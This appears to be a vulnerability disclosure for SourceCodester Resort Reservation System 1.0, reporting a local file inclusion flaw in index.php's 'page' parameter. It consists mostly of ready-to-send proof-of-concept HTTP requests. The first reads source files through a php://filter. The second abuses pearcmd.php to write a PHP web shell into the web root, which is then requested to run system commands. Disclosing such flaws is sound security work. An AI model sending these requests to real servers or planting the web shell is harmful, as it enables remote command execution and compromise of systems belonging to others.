# SourceCodester Resort Reservation System 1.0 has a local file inclusion vulnerability
## Software
- Software: Resort Reservation System 1.0
- Software Link: https://www.sourcecodester.com/php/16447/resort-reservation-system-php-and-sqlite3-source-code-free-download.html
- Vulnerability Type: local file inclusion
- Attack Type: Remote
- Vendor of Product: Sourcecodester

## Description
SourceCodester Resort Reservation System 1.0 allows local file inclusion via the page parameter after users logged in, this vulnerability leads to remote attackers execute system commands by including pearcmd.php

## Vulnerability Code
- index.php


## POC
- Local File Inclusion:
```http
GET /index.php?page=php://filter/read=convert.base64-encode/resource=DBConnection HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=618bc77tb1eq1tare3i7oic4u6

```
![](https://github.com/Yesec/Resort-Reservation-System/assets/19534204/5736f5b7-549c-4ba1-8ffa-6b4ec13f6e7f)



- Execute system commands:

```http
GET /index.php?page=/../../../../usr/share/php/pearcmd&+config-create+/&<?=system($_GET['a'])?>+/var/www/html/1.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=618bc77tb1eq1tare3i7oic4u6

```
The file path for pearcmd.php needs to be changed according to the actual situation. In the default PHP Docker environment, the file path for pearcmd.php is `/usr/local/lib/php/pearcmd.php`.
![](https://github.com/Yesec/Resort-Reservation-System/assets/19534204/8b2d8925-826b-4946-8163-46bd55e7d266)



requests 1.php to execute system commands:
![](https://github.com/Yesec/Resort-Reservation-System/assets/19534204/f21ab037-17be-4d46-ac5b-e2db9169abb8)

